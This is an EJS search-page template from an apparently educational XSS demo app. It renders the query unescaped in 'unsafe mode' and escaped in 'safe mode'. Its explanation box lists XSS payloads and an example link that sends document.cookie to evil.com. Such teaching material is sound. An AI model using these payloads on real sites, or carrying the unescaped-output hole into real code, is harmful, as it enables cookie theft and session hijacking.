<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Search — SecureBlog</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #e2e8f0; }
    .navbar { background: #1e293b; padding: 16px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
    .navbar h1 { color: #38bdf8; font-size: 20px; }
    .navbar a { color: #94a3b8; text-decoration: none; margin-left: 20px; font-size: 14px; }
    .navbar a:hover { color: #38bdf8; }
    .safe-toggle form { display: inline; }
    .safe-toggle button { padding: 6px 14px; border: none; border-radius: 6px; font-size: 13px; cursor: pointer; font-weight: bold; }
    .safe-on { background: #22c55e; color: white; }
    .safe-off { background: #ef4444; color: white; }
    .container { max-width: 900px; margin: 0 auto; padding: 30px 40px; }
    .search-bar { display: flex; gap: 8px; margin: 20px 0; }
    .search-bar input { flex: 1; padding: 10px 16px; border: 1px solid #334155; border-radius: 8px; background: #1e293b; color: #e2e8f0; font-size: 14px; }
    .search-bar input:focus { outline: none; border-color: #38bdf8; }
    button { padding: 10px 20px; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; }
    .btn-primary { background: #0ea5e9; color: white; }
    .post-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; margin-bottom: 16px; }
    .post-card h2 { font-size: 18px; margin-bottom: 6px; }
    .post-card h2 a { color: #e2e8f0; text-decoration: none; }
    .post-card p { color: #94a3b8; font-size: 14px; }
    code { background: #334155; padding: 2px 6px; border-radius: 4px; font-size: 13px; color: #fbbf24; }
    .concept-box { background: #1e293b; border-left: 3px solid #fbbf24; padding: 16px 20px; margin: 16px 0; border-radius: 0 8px 8px 0; }
    .concept-box h3 { color: #fbbf24; font-size: 14px; margin-bottom: 6px; }
    .concept-box p { color: #94a3b8; font-size: 13px; line-height: 1.5; }
    .result-box { padding: 14px; border-radius: 8px; margin: 12px 0; font-family: monospace; font-size: 13px; }
    .result-safe { background: #064e3b; border: 1px solid #059669; color: #6ee7b7; }
    .result-danger { background: #4c1d2e; border: 1px solid #ef4444; color: #fca5a5; }
    .tag-xss { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; background: #7c3aed20; color: #a78bfa; border: 1px solid #7c3aed; }
    .footer { margin-top: 40px; padding: 20px 40px; border-top: 1px solid #334155; color: #64748b; font-size: 13px; text-align: center; }
  </style>
</head>
<body>
  <nav class="navbar">
    <div style="display: flex; align-items: center; gap: 20px;">
      <h1>🛡️ SecureBlog</h1>
      <a href="/">Home</a>
      <a href="/search">Search</a>
      <a href="/dom-xss">DOM XSS</a>
      <a href="/playground">⚔️ Playground</a>
    </div>
    <div class="safe-toggle">
      <form action="/toggle-safe-mode" method="POST">
        <button class="<%= safeMode ? 'safe-on' : 'safe-off' %>">
          <%= safeMode ? '🛡️ SAFE' : '🔴 UNSAFE' %>
        </button>
      </form>
    </div>
  </nav>

  <div class="container">
    <h2 style="color: #38bdf8; margin-bottom: 8px;">
      🔍 Search <span class="tag-xss">Reflected XSS</span>
    </h2>

    <form action="/search" method="GET" class="search-bar">
      <input type="text" name="q" value="<%= query %>" placeholder="Search posts..." />
      <button class="btn-primary" type="submit">Search</button>
    </form>

    <% if (query) { %>
      <!-- ============================================ -->
      <!-- THIS IS WHERE REFLECTED XSS HAPPENS!         -->
      <!-- In UNSAFE mode, the query is rendered as raw  -->
      <!-- HTML using <%- %> (unescaped EJS).            -->
      <!-- In SAFE mode, we use <%= %> (auto-escaped).   -->
      <!-- ============================================ -->
      <div style="background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 16px; margin: 16px 0;">
        <% if (!safeMode) { %>
          <p style="color: #94a3b8;">
            Showing results for: <strong style="color: #e2e8f0;"><%- query %></strong>
          </p>
          <p style="color: #64748b; font-size: 12px; margin-top: 4px;">
            🔴 UNSAFE: Using <code>&lt;%- query %&gt;</code> (raw/unescaped output)
          </p>
        <% } else { %>
          <p style="color: #94a3b8;">
            Showing results for: <strong style="color: #e2e8f0;"><%= query %></strong>
          </p>
          <p style="color: #64748b; font-size: 12px; margin-top: 4px;">
            🛡️ SAFE: Using <code>&lt;%= query %&gt;</code> (auto-escaped output)
          </p>
        <% } %>
      </div>

      <% if (results.length > 0) { %>
        <% results.forEach(post => { %>
          <div class="post-card">
            <h2><a href="/post/<%= post.id %>" style="color: #e2e8f0; text-decoration: none;"><%= post.title %></a></h2>
            <p><%= post.content.substring(0, 150) %></p>
          </div>
        <% }) %>
      <% } else { %>
        <p style="color: #64748b; margin: 16px 0;">No posts found matching your search.</p>
      <% } %>
    <% } %>

    <div class="concept-box">
      <h3>🔴 Reflected XSS — How it works</h3>
      <p>
        The server takes input (URL parameter, form field) and <strong>reflects</strong> it back in the HTML response.<br>
        If the input isn't escaped, the browser treats it as HTML/JavaScript and <strong>executes it</strong>.<br><br>
        <strong>Try these in the search box:</strong><br>
        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
        <code>&lt;img src=x onerror=alert('XSS')&gt;</code><br>
        <code>&lt;b&gt;bold text&lt;/b&gt;</code> (harmless HTML injection)<br><br>
        <strong>Attack scenario:</strong> Attacker sends victim a link like:<br>
        <code>http://yoursite.com/search?q=&lt;script&gt;document.location='http://evil.com/?c='+document.cookie&lt;/script&gt;</code><br>
        When the victim clicks it, their cookies are sent to the attacker!<br><br>
        <strong>Defense:</strong> Escape all output! Use <code>&lt;%= %&gt;</code> in EJS (not <code>&lt;%- %&gt;</code>).<br>
        Toggle Safe Mode ON to see the fix.
      </p>
    </div>
  </div>

  <div class="footer">
    🛡️ Project 3: XSS Attack & Defense
  </div>
</body>
</html>
